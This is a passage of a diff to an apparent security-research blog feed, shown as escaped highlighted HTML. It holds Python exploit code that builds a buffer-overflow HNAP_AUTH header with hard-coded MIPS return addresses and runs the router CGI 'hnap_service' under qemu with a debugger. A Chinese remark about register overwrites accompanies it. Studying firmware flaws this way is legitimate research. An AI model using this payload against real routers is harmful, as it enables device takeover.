+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;CONTENT_LENGTH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;soap_body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ascii&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;COOKIE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uid=111&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HNAP_AUTH = (
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    b&amp;#34;a&amp;#34; * 1100
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    + b&amp;#34; \x43\x12\x40&amp;#34;   # 0x00431240
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    + b&amp;#34;b&amp;#34; * 32
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    + b&amp;#34; \x40\x33\xe8&amp;#34;   # 0x004033E8
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;print(f&amp;#39;HNAP_AUTH: {HNAP_AUTH}&amp;#39;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;HNAP_AUTH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1036&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x43\x12\x40&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x40\x33\xe8&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HNAP_AUTH: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HNAP_AUTH&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;subprocess.run(
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    [&amp;#39;/qemu-mips-static&amp;#39;, &amp;#39;-g&amp;#39;, &amp;#39;1235&amp;#39;, &amp;#39;/web/cgi-bin/hnap/hnap_service&amp;#39;],
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    input=soap_body,
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    env={
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;#39;REQUEST_METHOD&amp;#39;: REQUEST_METHOD,
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;#39;SOAP_ACTION&amp;#39;: SOAP_ACTION,
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;#39;CONTENT_LENGTH&amp;#39;: CONTENT_LENGTH,
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;#39;COOKIE&amp;#39;: COOKIE,
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;#39;HNAP_AUTH&amp;#39;: HNAP_AUTH
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;subprocess&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/qemu-mips-static&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;-g&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;1235&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/web/cgi-bin/hnap/hnap_service&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;soap_body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REQUEST_METHOD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;SOAP_ACTION&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SOAP_ACTION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;CONTENT_LENGTH&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CONTENT_LENGTH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;COOKIE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s1&#34;&gt;&amp;#39;HNAP_AUTH&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HNAP_AUTH&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;注意到一个奇怪的现象，Hnapauth中的普通字符串能直接覆盖寄存器，地址却不行&lt;/p&gt;
+&lt;/div&gt;&lt;img src=&#34;38.png&#34; style=&#34;width: 100%;&#34; /&gt;
 </description>
         </item>
         
